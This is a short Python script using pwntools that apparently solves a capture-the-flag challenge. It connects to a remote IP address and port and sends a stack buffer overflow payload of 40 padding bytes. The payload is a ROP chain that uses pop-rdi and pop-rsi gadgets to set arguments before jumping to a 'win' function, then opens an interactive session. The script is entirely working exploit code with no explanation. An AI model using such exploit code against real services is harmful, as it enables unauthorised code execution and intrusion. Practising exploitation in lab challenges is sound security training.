from pwn import *

p = remote("128.199.12.141", 7010)

buf = b'A'*40

win = p64(0x401142)

rdi_ret = p64(0x40121b)

rsi_r15_ret = p64(0x401219)

payload = buf + rdi_ret + p64(0xAAAA) + rsi_r15_ret + p64(0xBBBB) + p64(0xBBBB) + win

p.sendline(payload)

p.interactive()
